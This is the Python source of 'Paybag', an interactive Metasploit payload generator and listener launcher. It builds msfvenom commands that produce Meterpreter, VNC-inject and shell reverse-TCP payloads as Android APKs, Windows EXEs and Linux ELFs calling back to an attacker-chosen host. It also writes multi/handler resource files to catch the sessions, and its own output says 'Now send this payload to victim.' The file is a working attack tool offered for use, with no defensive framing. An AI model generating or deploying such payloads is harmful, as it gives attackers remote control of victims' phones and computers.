# Paybag

# Author - D3adpool2K

# github - https://github.com/Deadpool2000

import os
import random
import sys
from prettytable import PrettyTable
import distro

try:
    os.system('clear')
    R='\033[91m'
    Y='\033[93m'
    G='\033[92m'
    CY='\033[96m'
    W='\033[97m'
    B='\033[95m'
    global osname
    

    def start():
        print(CY+"""
    ____              __               
   / __ \____ ___  __/ /_  ____ _____ _
  / /_/ / __ `/ / / / __ \/ __ `/ __ `/
 / ____/ /_/ / /_/ / /_/ / /_/ / /_/ / 
/_/    \__,_/\__, /_.___/\__,_/\__, /  
            /____/            /____/  
"""+Y+"""
           [--"""+R+""">"""+Y+""" v1.2 """+R+"""<"""+Y+"""--]"""+G+"""

>> Payload generator for Metasploit <<"""+CY+"""
      ---------------------------"""+B+"""
        Code By -> Deadpool2000""")
        
    def main():
        print(R+"""\n************************************************"""+CY+"""\n
>>> Main menu"""+Y+"""

1) Create a payload
2) Start listner
3) Launch Metasploit
4) Exit\n""")

    def osi():
        print(R+"""\n
************************************************"""+Y+"""
            
>>> Select operating system to create payload\n"""+CY+"""
1) Android
2) Windows
3) Linux

99) Back to main menu\n""")

    def lst():
        print(R+"""\n
************************************************"""+Y+"""

>>> Select operating system to create listner\n"""+CY+"""
1) Android
2) Windows
3) Linux

99) Back to main menu\n""")

    def payld():
        print(R+"""
************************************************"""+Y+"""

>>> Select payload\n"""+CY+"""
1) windows/meterpreter/reverse_tcp
2) windows/x64/meterpreter/reverse_tcp (For 64-bit)
3) windows/vncinject/reverse_tcp
4) windows/x64/vncinject/reverse_tcp (For 64-bit)
5) windows/shell/reverse_tcp 
6) windows/x64/shell/reverse_tcp (For 64-bit)
7) windows/powershell_reverse_tcp 
8) windows/x64/powershell_reverse_tcp (For 64-bit)

99) Back to main menu\n""")

    def linux_payload():
        print(R+"""
************************************************"""+Y+"""

>>> Select payload\n"""+CY+"""
1) linux/x86/meterpreter/reverse_tcp
2) linux/x64/meterpreter/reverse_tcp (For 64-bit)
3) linux/x86/shell/reverse_tcp
4) linux/x64/shell/reverse_tcp (For 64-bit)

99) Back to main menu\n""")

    def arch1():
        print(CY+"""Select Architecture -"""+R+"""1)"""+Y+""" x86"""+R+""" 2)"""+Y+""" x64""")
    def checkver():
        if sys.version_info[0] < 3:
            print(Y+"Use Python 3 to run this script"+R+"!"+W)
            exit(0)
    def install():
        print(Y+"\nInstalling Metasploit-framework...\n"+W)
        did=distro.like()
        did2=distro.id()
        print("Current Distro: "+did)
        os.system("sudo curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && sudo chmod 755 msfinstall && sudo ./msfinstall")
        os.system("clear")
    
    def mk():
        if os.path.exists("payload")==False:
            os.system("mkdir payload")
    def check():
        try:
            os.remove('msh.rc')
        except FileNotFoundError:
            print()     
    pth="/data/data/com.termux/files/usr/bin/bash"
    def check2():
        if os.path.isfile(pth)==False:
            if os.path.isfile('/usr/bin/msfconsole')==False:
                print(R+"""
************************************************\n************************************************\n"""
+Y+"\nmsfconsole not found ! Please install Meatsploit-Framework properly and try again :( \n"+W)
                p=input(CY+"Install Metasploit?"+G+" (y|n)"+R+" >>> "+W)
                if p=="y":
                    install()
                    start()
                    mk()
                    check()
                    check2()
                    
                    main()                
                    sel()
                elif p=="n":
                    print(Y+"\nExit.........! Have a nice day :) ")
                    print(R+"\n------------"+CY+" Code by >>"+G+" Deadpool2000"+R+" ----------------------"+W)
                    exit(0)                
                else:
                    print(R+"\nInvalid choice ! Leaving.......\n"+W)
                    exit(0)                    
                exit(0)
    def cfile(lh,lp,ply):
        f=open("msh.rc","w+")
        l1="use exploit/multi/handler"
        l2="set PAYLOAD "+str(ply)
        l3="set LHOST "+str(lh)
        l4="set LPORT "+str(lp)
        l5="set ExitOnSession false"
        l6="exploit -j -z"
        f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
        f.close()
        return    
    def crplyd(lh,lp,ply,osname,ext):
        print(B+"\nGenerating payload..........\n")
        a=random.randint(1,99)
        st1=str(osname)+str(a)+str(ext)
        st="msfvenom -p "+str(ply)+" lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+str(st1)
        os.system(st)
        print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
        print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
        return
    def table():
        global ipd
        global adr
        tb=PrettyTable()
        tb.field_names=["No.","Interface","Address"]
        inte=os.listdir('/sys/class/net/')
        i=j=k=0
        adr=[]
        for i in range(len(inte)):
            cout=inte[i]
            st="ifconfig "+str(cout)+" | grep 'inet ' | cut -c 13-26"
            opt=os.popen(st)
            ipd=opt.read()
            cr=['n','e','t','m','a','s','k']
            for l in cr:
                ipd=ipd.replace(l,'')
            ipd=ipd.strip()
            adr.append(ipd)
            tb.add_row([k,inte[i],adr[j]])
            i+=1
            j+=1
            k+=1
        print(Y+"\n>>> Select LHOST from list\n"+W)
        print(tb)
        try:
            sc=int(input(G+"\nSelect your choice >>"+W+" "))
            try:
                ipd=adr[sc]
                if ipd=="":
                    print(R+"\nNull address found!Select another address!")
                    table()
                else:
                    print(CY+"\nSelected LHOST:"+W,ipd)
            except IndexError:
                print(R+"\nInvalid Choice! Please try again!")
                table()
        except ValueError:
            print(R+"\nInvalid Choice! Please try again!")
            table()      
    def sel():
        try:
            c=int(input(G+"Select your choice >>"+W+" "))      
            if c==1:
                def sel1():
                    try:
                        ch=int(input(G+"Select your choice >>"+W+" "))

                        # Android
                        
                        if ch==1: 
                            lh=input(CY+"\nEnter LHOST:"+W+" ")
                            lp=int(input(CY+"Enter LPORT:"+W+" "))
                            ply="android/meterpreter/reverse_tcp"
                            osname="android_"
                            ext=".apk"
                            crplyd(lh,lp,ply,osname,ext)
                            osi()
                            sel1()
                        
                        # Windows    

                        elif ch==2: 
                            try:
                                payld()
                                cc=int(input(G+"Select your choice >>"+W+" "))
                                if cc==1:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="windows/meterpreter/reverse_tcp"
                                    osname="win_"
                                    ext=".exe"
                                    crplyd(lh,lp,ply,osname,ext)
                                elif cc==2:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="windows/x64/meterpreter/reverse_tcp"
                                    osname="win_"
                                    ext=".exe"
                                    crplyd(lh,lp,ply,osname,ext)
                                elif cc==3:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="windows/vncinject/reverse_tcp"
                                    osname="win_"
                                    ext=".exe"
                                    crplyd(lh,lp,ply,osname,ext)
                                elif cc==4:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="windows/x64/vncinject/reverse_tcp"
                                    osname="win_"
                                    ext=".exe"
                                    crplyd(lh,lp,ply,osname,ext)
                                elif cc==5:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="windows/shell/reverse_tcp"
                                    osname="win_"
                                    ext=".exe"
                                    crplyd(lh,lp,ply,osname,ext)
                                elif cc==6:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="windows/x64/shell/reverse_tcp"
                                    osname="win_"
                                    ext=".exe"
                                    crplyd(lh,lp,ply,osname,ext)
                                elif cc==7:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="windows/powershell_reverse_tcp "
                                    osname="win_"
                                    ext=".exe"
                                    crplyd(lh,lp,ply,osname,ext)
                                elif cc==8:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="windows/x64/powershell_reverse_tcp "
                                    osname="win_"
                                    ext=".exe"
                                    crplyd(lh,lp,ply,osname,ext)
                                else:
                                    print(R+"\nInvalid Choice! Please try again!")
                                    osi()
                                    sel1()
                            except ValueError:
                                print(R+"\nInvalid Choice! Please try again!")
                                osi()
                                sel1()
                            osi()
                            sel1()

                        # Linux
                        
                        elif ch==3: 
                            try:
                                linux_payload()
                                cc=int(input(G+"Select your choice >>"+W+" "))
                                if cc==1:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="linux/x86/meterpreter/reverse_tcp"
                                    osname="linux_"
                                    ext=".elf"
                                    crplyd(lh,lp,ply,osname,ext)
                                elif cc==2:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="linux/x64/meterpreter/reverse_tcp"
                                    osname="linux_"
                                    ext=".elf"
                                    crplyd(lh,lp,ply,osname,ext)
                                elif cc==3:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="linux/x86/shell/reverse_tcp"
                                    osname="linux_"
                                    ext=".elf"
                                    crplyd(lh,lp,ply,osname,ext)
                                elif cc==4:
                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
                                    ply="linux/x64/shell/reverse_tcp"
                                    osname="linux_"
                                    ext=".elf"
                                    crplyd(lh,lp,ply,osname,ext)
                                else:
                                    print(R+"\nInvalid Choice! Please try again!")
                                    osi()
                                    sel1()                           
                            except ValueError:
                                print(R+"\nInvalid Choice! Please try again!")
                                osi()
                                sel1()
                            osi()
                            sel1()
                        elif ch==99:
                            os.system('clear')
                            start()
                            main()
                            sel()
                        else:
                            print(R+"\nInvalid Choice! Please try again\n")
                            osi()
                            sel1()
                    except ValueError:
                        print(R+"\nInvalid input ! Please try again !\n")
                        sel1()
                osi()
                sel1()
            elif c==2:
                def sel2():
                    try:
                        ch=int(input(G+"Select your choice >>"+W+" "))
                        if ch==1:
                            pr=os.path.isfile("msh.rc")
                            if pr:
                                check()
                            else:
                                table()
                                lh=ipd
                                lp=int(input(CY+"Enter LPORT:"+W+" "))
                                ply="android/meterpreter/reverse_tcp"
                                cfile(lh,lp,ply)
                            os.system('clear')
                            print(Y+"\nStarting handler...............\n"+W)
                            os.system("msfconsole -r msh.rc")
                            os.remove('msh.rc')
                            os.system("clear")                      
                            lst()
                            sel2()
                        elif ch==2:
                            try:
                                pr=os.path.isfile('msh.rc')
                                if pr:
                                    check()
                                else:
                                    payld()
                                    ch=int(input(G+"Select your choice >>"+W+" "))
                                    if ch==1:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="windows/meterpreter/reverse_tcp"
                                        cfile(lh,lp,ply)
                                    elif ch==2:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="windows/x64/meterpreter/reverse_tcp"
                                        cfile(lh,lp,ply)
                                    elif ch==3:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="windows/vncinject/reverse_tcp"
                                        cfile(lh,lp,ply)
                                    elif ch==4:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="windows/x64/vncinject/reverse_tcp"
                                        cfile(lh,lp,ply)
                                    elif ch==5:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="windows/shell/reverse_tcp"
                                        cfile(lh,lp,ply)
                                    elif ch==6:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="windows/x64/shell/reverse_tcp"
                                        cfile(lh,lp,ply)
                                    elif ch==7:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="windows/powershell_reverse_tcp"
                                        cfile(lh,lp,ply)
                                    elif ch==8:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="windows/x64/powershell_reverse_tcp"
                                        cfile(lh,lp,ply)
                                    else:
                                        print(R+"\nInvalid choice! Please try again\n")
                                        lst()
                                        sel2()
                                os.system('clear')
                                print(Y+"\nStarting handler...............\n"+W)
                                os.system("msfconsole -r msh.rc")
                                os.remove('msh.rc')
                                os.system('clear')
                                lst()
                                sel2()
                            except ValueError:
                                print(R+"\nInvalid choice! Please try again\n")
                                lst()
                                sel2()
                        elif ch==3:
                            try:
                                pr=os.path.isfile('msh.rc')
                                if pr:
                                    check()
                                else:
                                    linux_payload()
                                    ch=int(input(G+"Select your choice >>"+W+" "))
                                    if ch==1:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="linux/x86/meterpreter/reverse_tcp"
                                        cfile(lh,lp,ply)
                                    elif ch==2:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="linux/x64/meterpreter/reverse_tcp"
                                        cfile(lh,lp,ply)
                                    elif ch==3:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="linux/x86/shell/reverse_tcp"
                                        cfile(lh,lp,ply)
                                    elif ch==4:
                                        table()
                                        lh=ipd
                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
                                        ply="linux/x64/shell/reverse_tcp"
                                        cfile(lh,lp,ply)
                                    else:
                                        print(R+"\nInvalid choice! Please try again\n")
                                        lst()
                                        sel2()
                                os.system('clear')
                                print(Y+"\nStarting handler...............\n"+W)
                                os.system("msfconsole -r msh.rc")
                                os.remove('msh.rc')
                                os.system('clear')
                                lst()
                                sel2()
                            except ValueError:
                                print(R+"\nInvalid choice! Please try again\n")
                                lst()
                                sel2()
                        elif ch==99:
                            check()
                            os.system('clear')
                            start()
                            main()
                            sel()
                        else:
                            check()
                            print(R+"\nInvalid choice! Please try again\n")
                            lst()
                            sel2()
                    except ValueError:
                        print(R+"\nInvalid input ! Please try again !\n")
                        sel2()
                lst()
                sel2()                
            elif c==3:
                os.system('clear')
                print(Y+"\n>>> Launching msfconsole..................\n\n"+W)
                os.system("msfconsole")
                os.system('clear')
                start()
                main()
                sel()
            elif c==4:
                check()
                print(R+"************************************************")
                print(Y+"\nExit.........! Have a nice day :) ")
                print(R+"\n------------"+CY+" Code by >> "+G+" Deadpool2000"+R+" ----------------------"+W)
                print(R+"------------"+CY+" Youtube >> "+G+" https://bit.ly/2HnPZd2"+R+" ------------\n"+W)
            else:
                check()
                print(R+"\nInvalid choice ! Please try again :(\n")
                main()                
                sel()
        except ValueError:
            print(R+"\nInvalid input ! Please try again!\n")
            sel()
    def ch3():
        if os.path.isfile(pth)==True:
            if os.path.isfile('/data/data/com.termux/files/usr/bin/msfvenom')==False:
                print(R+"""
************************************************\n"""
+Y+"""\nmsfconsole and msfvenom not found in '/data/data/com.termux/files/usr/bin/'\n""")
                p=input(CY+"Install Metasploit in Termux ?"+G+" (y|n)"+R+" >>> "+W)
                if p=="y":
                    ver="6.3.43"
                    os.system("apt install -y ruby wget apr apr-util libiconv zlib autoconf bison clang coreutils curl findutils git libffi libgmp libpcap postgresql readline libsqlite openssl libtool libxml2 libxslt ncurses pkg-config make libgrpc termux-tools ncurses-utils ncurses tar termux-elf-cleaner unzip zip")
                    lk="wget -O msf.tar.gz https://github.com/rapid7/metasploit-framework/archive/"+ver+".tar.gz"
                    os.system(str(lk))
                    os.system("mv msf.tar.gz $HOME")
                    os.system("tar -xvf $HOME/msf.tar.gz && mv metasploit-framework-"+ver+" $HOME/metasploit-framework && rm $HOME/msf.tar.gz")
                    os.system("gem install --no-document --verbose rubygems-update && update_rubygems")
                    os.system("gem install bundler && bundle config build.nokogiri --use-system-libraries && cd $HOME/metasploit-framework && bundle install")
                    os.system("cp assets/termux/msfconsole $PREFIX/bin/ && cp assets/termux/msfvenom $PREFIX/bin/")
                    os.system("chmod +x $PREFIX/bin/msfconsole")
                    os.system("chmod +x $PREFIX/bin/msfvenom")
                    os.system('clear')
                    checkver()
                    start()
                    mk()
                    check()
                    check2()
                   
                    main()                
                    sel()
                elif p=="n":
                    print(Y+"\nExit.........! Have a nice day :) ")
                    print(R+"\n------------"+CY+" Code by >>"+G+" Deadpool2000"+R+" ----------------------"+W)
                    print(R+"------------"+CY+" Youtube >>"+G+" https://bit.ly/2HnPZd2"+R+" ------------\n"+W)
                    exit(0)                
                else:
                    print(R+"\nInvalid choice ! Leaving.......\n"+W)
                    exit(0)                    
    checkver()
    start()
    mk()
    check()
    check2()
    #ch3
    main()                
    sel()  
except KeyboardInterrupt:
    check()
    print(CY+"""\n
************************************************"""+G+
"\n\n>>> "+R+"Interrupted!"+Y+" Exiting.........\n"+W)
    print(R+"\n------------"+CY+" Code by >> "+G+" Deadpool2000"+R+" ----------------------"+W)
    print(R+"------------"+CY+" Youtube >> "+G+" https://bit.ly/2HnPZd2"+R+" ------------\n"+W)
